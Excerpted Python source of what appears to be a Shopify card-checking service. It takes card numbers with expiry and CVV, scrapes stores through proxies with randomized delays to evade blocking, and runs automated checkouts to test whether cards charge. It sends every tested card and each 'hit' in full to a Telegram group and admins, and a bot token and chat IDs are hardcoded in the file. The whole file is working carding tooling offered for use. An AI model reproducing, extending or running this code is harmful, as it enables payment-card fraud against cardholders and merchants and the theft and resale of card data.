...
TELEGRAM_BOT_TOKEN = "6721837907:AAG8NYYLoyKZ-BbcHcKiZImbCFUWWbA9Fu0"
TELEGRAM_ADMIN_IDS = ["5237309941"]      # Private logs
TELEGRAM_GROUP_ID = "-1003737740461"         # Hits (Charged / Approved) forwarded here
...
async def fetch_products(domain, proxy_str=None):
    ...
    # Real browser navigation headers
    nav_headers = {
    ...
    # ═══════════════════════════════════════════════════════
    # Use ONE session so cookies persist across requests
    # ═══════════════════════════════════════════════════════
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        # ── METHOD 0: Warm up cookies on homepage ──
        try:
            async with session.get(domain, proxy=proxy_url, headers=nav_headers, ssl=False) as warm:
                if warm.status in (429, 403, 503):
                    # Proxy is burned on this store entirely
                    return False, "PROXY_BANNED"
                home_html = await warm.text()
        ...
        # ── METHOD 1: Extract handles from homepage ──
        handles = []
        for h in re.findall(r'href="[^"]*/products/([^"\s?]+)"', home_html):
            if h not in handles and not h.startswith('http') and "'" not in h:
                handles.append(h)

        # ── METHOD 2: Collection /all page ──
        if not handles:
            try:
                await asyncio.sleep(random.uniform(0.8, 1.5))
                c_headers = {**nav_headers, 'Referer': domain, 'sec-fetch-site': 'same-origin'}
                async with session.get(f"{domain}/collections/all", proxy=proxy_url, headers=c_headers, ssl=False) as c_resp:
                    if c_resp.status == 200:
                        c_html = await c_resp.text()
                        for h in re.findall(r'href="[^"]*/products/([^"\s?]+)"', c_html):
                            if h not in handles and not h.startswith('http') and "'" not in h:
                                handles.append(h)
            except Exception:
                pass

        # ── METHOD 3: Search Suggest API (often unprotected) ──
        if not handles:
            try:
                ...
                search_url = f"{domain}/search/suggest.json?q=a&resources[type]=product&resources[limit]=20&resources[options[fields]]=title,product_type,variants.title"
                async with session.get(search_url, proxy=proxy_url, headers=s_headers, ssl=False) as s_resp:
                    if s_resp.status == 200:
                        s_data = await s_resp.json(content_type=None)
                        resources = s_data.get('resources', {}).get('results', {})
                        for product in resources.get('products', []):
                            handle = product.get('handle')
                            if handle and handle not in handles:
                                handles.append(handle)
                            # Some suggest APIs return variants directly
                            for v in product.get('variants', []):
                                ...
                                if vid:
                                    ...
                                    return {'variant_id': str(vid), 'price': str(price)}
            except Exception:
                pass
        ...
        if not handles:
            try:
                await asyncio.sleep(random.uniform(0.5, 1.0))
                async with session.get(f"{domain}/sitemap.xml", proxy=proxy_url, headers=nav_headers, ssl=False) as sm:
                    if sm.status == 200:
                        sm_text = await sm.text()
                        urls = re.findall(r'<loc>([^<]+)</loc>', sm_text)
                        for u in urls:
                            if '/products/' in u and '/collections/' not in u and '/pages/' not in u:
                                h = u.split('/products/')[-1].split('.')[0].split('?')[0]
                                if h and h not in handles:
                                    handles.append(h)
            except Exception:
                pass

        # ── METHOD 5: Deep scrape product pages for variant IDs ──
        for idx, handle in enumerate(handles[:12]):
            if idx > 0:
                await asyncio.sleep(random.uniform(1.5, 3.0))

            try:
                p_url = f"{domain}/products/{handle}"
                p_headers = {
                    **nav_headers,
                    'Referer': f"{domain}/collections/all",
                    'sec-fetch-site': 'same-origin',
                }

                async with session.get(p_url, proxy=proxy_url, headers=p_headers, ssl=False) as p_resp:
                    if p_resp.status != 200:
                        continue
                    p_html = await p_resp.text()

                    # 5a: ProductJson-* script blocks
                    scripts = re.findall(
                        r'<script[^>]*type=["\']application/json["\'][^>]*(?:id=["\']ProductJson-[^"\']*["\'])?[^>]*>(.*?)</script>',
                        p_html, re.DOTALL | re.IGNORECASE
                    )
                            ...
                            if variants:
                                for v in variants:
                                    if v.get('available', True):
                                        ...
                                        if isinstance(price, int):
                                            price = str(price / 100.0)
                                        return {'variant_id': str(v['id']), 'price': str(price)}
                        except Exception:
                            continue

                    # 5b: window.ShopifyAnalytics.meta
                    meta_match = re.search(
                        r'window\.ShopifyAnalytics\.meta\s*=\s*({.+?});?\s*</script>',
                        p_html, re.DOTALL
                    )
                    if meta_match:
                        try:
                            ...
                            # Sometimes page level has variantId directly
                            page_vid = meta.get('page', {}).get('productVariantId')
                            if page_vid:
                                return {'variant_id': str(page_vid), 'price': str(product.get('price', '0.00'))}
                            for v in product.get('variants', []):
                                if v.get('available', True):
                                    return {'variant_id': str(v['id']), 'price': str(v.get('price', '0.00'))}
                        except Exception:
                            pass

                    # 5c: window.__SHOPIFY_STATE__
                    state_match = re.search(
                        r'window\.__SHOPIFY_STATE__\s*=\s*({.+?});?\s*</script>',
                        p_html, re.DOTALL
                    )
                    if state_match:
                        try:
                            state = json.loads(state_match.group(1))
                            prods = state.get('products', {})
                            if prods:
                                first = list(prods.values())[0]
                                for v in first.get('variants', []):
                                    vid = v.get('id') or v.get('variantId')
                                    if vid:
                                        return {'variant_id': str(vid), 'price': str(v.get('price', '0.00'))}
                        except Exception:
                            pass

                    # 5d: window.__INITIAL_STATE__
                    ...
                    if init_match:
                        try:
                            ...
                            for v in state.get('product', {}).get('variants', []):
                                if v.get('id'):
                                    return {'variant_id': str(v['id']), 'price': str(v.get('price', '0.00'))}
                        except Exception:
                            pass

                    # 5e: Brute-force variant IDs in source
                    ids = re.findall(r'["\']variantId["\']?\s*[:=]\s*["\']?(\d{10,})["\']?', p_html)
                    if ids:
                        return {'variant_id': str(ids[0]), 'price': '0.00'}
        ...
        # ── METHOD 6: JSON Fallback (long cooldown, last resort) ──
        ...
        try:
            ...
            async with session.get(f"{domain}/products.json?limit=50", proxy=proxy_url, headers=j_headers, ssl=False) as j_resp:
                if j_resp.status == 429:
                    return False, "PROXY_BANNED"
                if j_resp.status != 200:
                    return False, f"HTTP_{j_resp.status}"
                text = await j_resp.text()
    ...
    return False, "SITE_BLOCKED_TRY_VARIANT"
...
def is_captcha_required(response_text):
    ...
    indicators = [
        ...
        '"message":"CAPTCHA_REQUIRED"', 'captcha required', 'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha'
    ]
...
async def make_graphql_request(session, graphql_url, params, headers, json_data, proxy=None, max_retries=1):
...
async def send_hit_async(cc_string, site, gateway, price, currency, response_msg):
    ...
    message_text = f"""🔥 <b>{bs('HIT: Charged / Approved')}</b> 🔥
<b>━━━━━━━━━━━━━━━━━</b>
...
async def send_log_async(cc_string, site, gateway, price, currency, response_msg):
    cc_num = cc_string.split('|')[0].strip() if cc_string else ""
    bi = await get_bin_info(cc_num)
    price_str = f"${price}" if price else "-"
    if currency and currency != "USD" and price:
        price_str += f" {currency}"
    message_text = f"""🔔 <b>{bs('LOG')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}:</b> <code>{cc_string}</code>
🏦 <b>{bs('Gateway')}:</b> <code>{gateway}</code>
📟 <b>{bs('Response')}:</b> <code>{response_msg}</code>
...
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>"""
    async with aiohttp.ClientSession() as session:
        for admin_id in TELEGRAM_ADMIN_IDS:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": admin_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True}
            try:
                await session.post(url, json=payload)
            except Exception:
                pass
...
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    ...
    # Parse proxy from API param only. No hardcoded fallback.
    proxy_url = parse_proxy(proxy_str) if proxy_str else None
    ...
    try:
        ...
        # Fetch variant if not provided
        if not variant_id:
            info = await fetch_products(ourl, proxy_url)
            if isinstance(info, tuple):
                return False, info[1] if len(info) > 1 else "Fetch failed. Use ?variant=ID", gateway, total_price, currency
            variant_id = info.get('variant_id')
            if not variant_id:
                return False, "Fetch failed. Use ?variant=ID", gateway, total_price, currency
        ...
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            ...
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy_url)
            if cart_resp.status != 200:
                ...
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy_url)
            if cart_resp.status != 200:
            ...
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy_url)
            ...
            # Extract build ID, source token, ident sig
            ...
            for i in range(2):
                response, resp_text, _ = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy=proxy_url)
                if i == 0:
            ...
            try:
                ...
                return False, f"Parse error: {str(e)}", gateway, total_price, currency
            ...
            if delivery_type == 'FilledDeliveryTerms':
                ...
                if delivery_lines and len(delivery_lines) > 0:
                    ...
                    if available_strategies and len(available_strategies) > 0:
                        ...
                        ship_amt = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(ship_amt)
                        except:
                            shipping_amount = 0.0
            ...
            if not payment_identifier:
                return False, "No valid payment method", gateway, total_price, currency
            ...
            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy_url)
            try:
            ...
            response, text, _ = await make_graphql_request(session, graphql_url, params, headers, submit_json_data, proxy=proxy_url)
            ...
            try:
                ...
                return False, "Invalid JSON submit response", gateway, total_price, currency
            except Exception as e:
                return False, f"Submit parse error: {str(e)}", gateway, total_price, currency
            ...
            for i in range(5):
                response, final_text, _ = await make_graphql_request(session, graphql_url, params, headers, poll_json_data, proxy=proxy_url)
        ...
        err_str = str(e).lower()
        if proxy_url and ('proxy' in err_str or 'tunnel' in err_str or 'connection' in err_str):
            return False, "Proxy Error", gateway, total_price, currency
...
def shopify_checker():
    try:
        ...
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter. Format: CC|MM|YYYY|CVV", "status": False}), 400
        ...
        hit_keywords = [
            'order_placed', 'order_paid', 'order_confirmed', 'thank you',
            'payment successful', 'order_completed', 'charged', 'order_created',
            'otp_required', '3d_secure', 'authentication_required'
        ]
        is_hit = any(kw in clean_lower for kw in hit_keywords)
            ...
            try:
                ...
                try:
                    loop.run_until_complete(
                        send_hit_async(cc_string, site, gateway, price, currency, clean_response)
                    )
                finally:
                    loop.close()
            except Exception:
        ...
        try:
            ...
            try:
                loop.run_until_complete(
                    send_log_async(cc_string, site, gateway, price, currency, clean_response)
                )
            finally:
                loop.close()
        except Exception:
        ...
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price and price.replace('.', '', 1).replace('-', '').isdigit() else 0.0,
